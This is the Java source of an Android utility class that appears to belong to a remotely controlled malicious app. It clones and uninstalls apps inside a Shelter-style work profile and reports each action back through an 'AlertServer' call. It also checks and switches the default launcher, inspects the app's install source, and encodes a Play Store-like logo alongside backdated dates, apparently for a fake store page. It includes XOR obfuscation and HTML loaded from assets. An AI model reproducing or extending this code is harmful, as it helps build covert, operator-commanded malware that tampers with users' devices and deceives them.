package com.appd.instll;

import static android.content.Context.MODE_PRIVATE;
import static com.appd.instll.constants.deckeysop;
import static com.appd.instll.shalter.Utility.AlertServer;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.InstallSourceInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;

import android.os.Build;
import android.util.Base64;
import android.util.Log;


import androidx.core.content.ContextCompat;

import com.appd.instll.shalter.ApplicationInfoWrapper;
import com.appd.instll.shalter.DummyActivity;
import com.appd.instll.shalter.IAppInstallCallback;
import com.appd.instll.shalter.IShelterService;
import com.appd.instll.shalter.ShelterService;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ThreadLocalRandom;


public class tools {
    public static String getLabelApplication(Context context) {
        try {
            return (String) context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA));
        }catch (Exception ex){
        }
        return  "";
    }
    public static ApplicationInfoWrapper getAppInfoWrapper(Context context, String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            // Create wrapper and load label
            return new ApplicationInfoWrapper(appInfo).loadLabel(pm);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return null; // Package not found
        }
    }


    public static void UnFreezAndStart(Context ctx, String pkg){
        try{
            Intent intent = new Intent(DummyActivity.UNFREEZE_AND_LAUNCH);
            intent.setComponent(new ComponentName(ctx, DummyActivity.class));
            intent.putExtra("packageName", pkg);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            DummyActivity.registerSameProcessRequest(intent);
            ctx.startActivity(intent);
        }catch (Exception a){}
    }
    public static void cloneapp(Context ctx, String pkg, IShelterService srvtarget){
        ApplicationInfoWrapper app = getAppInfoWrapper(ctx,pkg );
        if (app != null) {
            String appname = app.getLabel();
            IAppInstallCallback.Stub callback = new IAppInstallCallback.Stub() {
                @Override
                public void callback(int result) {
                    if (result == Activity.RESULT_OK) {
                        Log.d("clone app","RESULT_OK");
                        AlertServer(ctx,"Cloning Success");
                    } else if (result == ShelterService.RESULT_CANNOT_INSTALL_SYSTEM_APP) {
                        Log.d("clone app","RESULT_NO");
                        AlertServer(ctx,"Cloning Failed");
                    }
                }
            };

            try{
                srvtarget.installApp(app, callback);
                AlertServer(ctx,"Cloning "+appname+" started");
            }catch (Exception d){
                d.printStackTrace();
            }
        }else{
            AlertServer(ctx,"App not found");
        }
    }
    public static void removeapp(Context ctx, String pkg, IShelterService srvtarget){
        ApplicationInfoWrapper app = getAppInfoWrapper(ctx,pkg );
        if (app != null) {
            String appname = app.getLabel();
            IAppInstallCallback.Stub callback = new IAppInstallCallback.Stub() {
                @Override
                public void callback(int result) {
                    if (result == Activity.RESULT_OK) {
                        Log.d("Uninstall app","RESULT_OK");
                        AlertServer(ctx,"Uninstall Success");
                    } else if (result == ShelterService.RESULT_CANNOT_INSTALL_SYSTEM_APP) {
                        Log.d("Uninstall app","RESULT_NO");
                        AlertServer(ctx,"Uninstall Failed");
                    }
                }
            };

            try{
                srvtarget.uninstallApp(app, callback);
                AlertServer(ctx,"Uninstall "+appname+" started");
            }catch (Exception d){
                d.printStackTrace();
            }
        }else{
            AlertServer(ctx,"App not found");
        }
    }
    public static boolean isMyAppLauncherDefault(Context ctx) {
        final IntentFilter filter = new IntentFilter(Intent.ACTION_MAIN);
        filter.addCategory(Intent.CATEGORY_HOME);

        List<IntentFilter> filters = new ArrayList<IntentFilter>();
        filters.add(filter);

        final String myPackageName = ctx.getPackageName();
        List<ComponentName> activities = new ArrayList<ComponentName>();
        final PackageManager packageManager = (PackageManager) ctx.getPackageManager();

        packageManager.getPreferredActivities(filters, activities, null);

        for (ComponentName activity : activities) {
            if (myPackageName.equals(activity.getPackageName())) {
                return true;
            }
        }
        return false;
    }
    public static String getDefaultLauncherPackage(Context context) {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);

        ResolveInfo resolveInfo = context.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
        if (resolveInfo != null && resolveInfo.activityInfo != null) {
            return resolveInfo.activityInfo.packageName;
        }
        return null;
    }
    public static void openOtherLauncher(Context context) {
        PackageManager pm = context.getPackageManager();

        // Intent to find all launchers
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);

        // Get all launchers
        List<ResolveInfo> launchers = pm.queryIntentActivities(intent, 0);

        for (ResolveInfo info : launchers) {
            String pkg = info.activityInfo.packageName;
            String cls = info.activityInfo.name;

            if (pkg.equals("com.android.settings") && cls.contains("FallbackHome")) continue;

            // Skip your own app
            if (!pkg.equals(context.getPackageName())) {
                //Intent launchIntent = pm.getLaunchIntentForPackage(pkg);
                                        Intent i = new Intent();
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT);
                        intent.setPackage(pkg);
                        i.setAction(Intent.ACTION_MAIN);
                        i.addCategory(Intent.CATEGORY_HOME);
                context.startActivity(i);
                //if (launchIntent != null) {
                   // launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                   // context.startActivity(launchIntent);
                    return;
               // }
            }
        }

        // If no other launcher found, stay in your app
        Log.w("LauncherTest", "No other launcher found.");
    }

    private static final char[] ALPHANUM =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".toCharArray();

    public static String randomString(int length) {
        char[] buffer = new char[length];
        ThreadLocalRandom rnd = ThreadLocalRandom.current();
        for (int i = 0; i < length; i++) {
            buffer[i] = ALPHANUM[rnd.nextInt(ALPHANUM.length)];
        }
        return new String(buffer);
    }
    public static String getplayicon(Context context) {
        try{
            Bitmap bm = BitmapFactory.decodeResource(context.getResources(), R.drawable.plylogoname);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            bm.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
            byte[] iconBytes = outputStream.toByteArray();

            // Encode to Base64
            String plylogo = Base64.encodeToString(iconBytes, Base64.DEFAULT) ;
            try {
                outputStream.close();
            } catch (IOException e) {

            }
            return plylogo;
        }catch (Exception a){

        }
        return "";
    }
    public static String getAppIconAsBase64(Context context) {
        try {
            // Get package manager and app info
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo appInfo = context.getApplicationInfo();

            // Get the app icon as Drawable
            Drawable drawable = packageManager.getApplicationIcon(appInfo);

            // Convert Drawable to Bitmap
            Bitmap bitmap = ((BitmapDrawable) drawable).getBitmap();

            // Convert Bitmap to Base64 string
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
            byte[] iconBytes = outputStream.toByteArray();

            // Encode to Base64
            return Base64.encodeToString(iconBytes, Base64.DEFAULT);

        } catch (Exception e) {
            e.printStackTrace();
            return ""; // Return null if something goes wrong
        }
    }
    public static String getDrawableAsBase64(Context context, int drawableResId) {
        try {
            // Try to load drawable from resources
            Drawable drawable = ContextCompat.getDrawable(context, drawableResId);
            if (drawable == null)
                throw new Exception("Drawable not found");

            // Convert to Bitmap
            Bitmap bitmap;
            if (drawable instanceof BitmapDrawable) {
                bitmap = ((BitmapDrawable) drawable).getBitmap();
            } else {
                // Create bitmap for non-bitmap drawables (Vector, Shape, etc.)
                bitmap = Bitmap.createBitmap(
                        drawable.getIntrinsicWidth(),
                        drawable.getIntrinsicHeight(),
                        Bitmap.Config.ARGB_8888
                );
                Canvas canvas = new Canvas(bitmap);
                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                drawable.draw(canvas);
            }

            // Convert Bitmap → Base64
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
            byte[] bytes = outputStream.toByteArray();

            return Base64.encodeToString(bytes, Base64.DEFAULT);

        } catch (Exception e) {
            e.printStackTrace();

            // Fallback: return app icon in Base64
            return getAppIconAsBase64(context);
        }
    }
    // ✅ MANTÉM XOR PARA COMPATIBILIDADE (se necessário)
    public static byte[] xorBytes(byte[] data, String password) {
        byte[] key = password.getBytes(StandardCharsets.UTF_8);
        byte[] result = new byte[data.length];

        for (int i = 0; i < data.length; i++) {
            result[i] = (byte)(data[i] ^ key[i % key.length]);
        }

        return result;
    }

    public static String loadHtmlFromAssets(Context ctx, String fileName) throws IOException {
        try (InputStream is = ctx.getAssets().open(fileName)) {
            byte[] data = readFully(is);

            // ✅ SEM DESCRIPTOGRAFIA - CARREGA DIRETO
            String html = new String(data, StandardCharsets.UTF_8);
            Log.d("loadHtmlFromAssets", "✅ HTML carregado: " + fileName + " (" + html.length() + " bytes)");
            return html;
        } catch (Exception e) {
            Log.e("loadHtmlFromAssets", "❌ Erro ao carregar: " + fileName, e);
            throw new IOException("Falha ao carregar HTML: " + fileName, e);
        }
    }


    private static byte[] readFully(InputStream is) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] temp = new byte[4096];
        int read;
        while ((read = is.read(temp)) != -1) {
            buffer.write(temp, 0, read);
        }
        return buffer.toByteArray();
    }



    private static boolean looksLikeBase64(byte[] data) {
        if (data.length < 3) return false;
        return (data[0] == 'P' && data[1] == 'C' && data[2] == 'F') ||
                (data[0] == 'P' && data[1] == 'G' && data[2] == 'h');
    }

    public static String getFormattedDateMinusDays(int daysBack) {
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.DAY_OF_YEAR, -daysBack);
        Date resultDate = calendar.getTime();

        SimpleDateFormat formatter = new SimpleDateFormat("MMM d, yyyy", Locale.US);
        return formatter.format(resultDate);
    }
//    public static boolean isActivityAvailableAndEnabled(Context context, String packageName, String className) {
//        try {
//            ComponentName componentName = new ComponentName(packageName, className);
//            ActivityInfo activityInfo = context.getPackageManager().getActivityInfo(componentName, 0);
//
//            // Check if the activity is enabled and exported
//            return activityInfo.enabled && activityInfo.exported;
//        } catch (PackageManager.NameNotFoundException e) {
//            // Activity not found or app not installed
//            return false;
//        }
//    }

    public static boolean isAppInstalled(Context context, String packageName) {
        //return false;
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
//    private class SecurityMonitor implements Runnable {
//        @Override
//        public void run() {
//            try {
//                Thread.sleep(100);
//                Log.d("SecurityMonitor", "Monitoring complete");
//            } catch (InterruptedException e) {
//                Log.e("SecurityMonitor", "Interrupted", e);
//            }
//        }
//    }

//    public static void logAppInfo(Context context) {
//        try {
//            PackageManager pm = context.getPackageManager();
//            String packageName = context.getPackageName();
//
//            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
//            PackageInfo pkgInfo = pm.getPackageInfo(packageName, PackageManager.GET_SIGNING_CERTIFICATES);
//
//            Log.i("APP_INFO", "================ APP INFO ================");
//            Log.i("APP_INFO", "Package Name      : " + packageName);
//            Log.i("APP_INFO", "App Name          : " + pm.getApplicationLabel(appInfo));
//
//            // APK paths
//            Log.i("APP_INFO", "Source Dir        : " + appInfo.sourceDir);
//            Log.i("APP_INFO", "Public Source Dir : " + appInfo.publicSourceDir);
//            Log.i("APP_INFO", "Data Dir          : " + appInfo.dataDir);
//
//            // Split APKs (if any)
//            if (appInfo.splitSourceDirs != null) {
//                for (int i = 0; i < appInfo.splitSourceDirs.length; i++) {
//                    Log.i("APP_INFO", "Split APK [" + i + "]   : " + appInfo.splitSourceDirs[i]);
//                }
//            } else {
//                Log.i("APP_INFO", "Split APKs        : none");
//            }
//
//            // Version info
//            Log.i("APP_INFO", "Version Name      : " + pkgInfo.versionName);
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
//                Log.i("APP_INFO", "Version Code      : " + pkgInfo.getLongVersionCode());
//            }
//
//            // Install / update times
//            Log.i("APP_INFO", "First Install     : " + new Date(pkgInfo.firstInstallTime));
//            Log.i("APP_INFO", "Last Update       : " + new Date(pkgInfo.lastUpdateTime));
//
//            // Install source (Play Store, etc.)
//            String installer;
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//                installer = pm.getInstallSourceInfo(packageName).getInstallingPackageName();
//            } else {
//                installer = pm.getInstallerPackageName(packageName);
//            }
//            Log.i("APP_INFO", "Installed From    : " + installer);
//
//            // UID / flags
//            Log.i("APP_INFO", "UID               : " + appInfo.uid);
//            Log.i("APP_INFO", "System App        : " +
//                    ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0));
//
//            Log.i("APP_INFO", "==========================================");
//
//        } catch (Exception e) {
//            Log.e("APP_INFO", "Failed to log app info", e);
//        }
//    }


    public static String getInstallerPackageName( Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            String myPackage = context.getPackageName();

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                InstallSourceInfo info = pm.getInstallSourceInfo(myPackage);
                return info != null ? info.getInstallingPackageName() : null;
            } else {
                return pm.getInstallerPackageName(myPackage);
            }

        } catch (Exception e) {
            return null;
        }
    }

    public static void saveFlag(Context ctx,boolean value) {
        SharedPreferences prefs = ctx.getSharedPreferences("MyPrefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putBoolean("selfer", value);
        editor.apply(); // or commit()
    }


    public static boolean loadFlag(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences("MyPrefs", MODE_PRIVATE);
        return prefs.getBoolean("selfer", false); // false is default if not set
    }

}
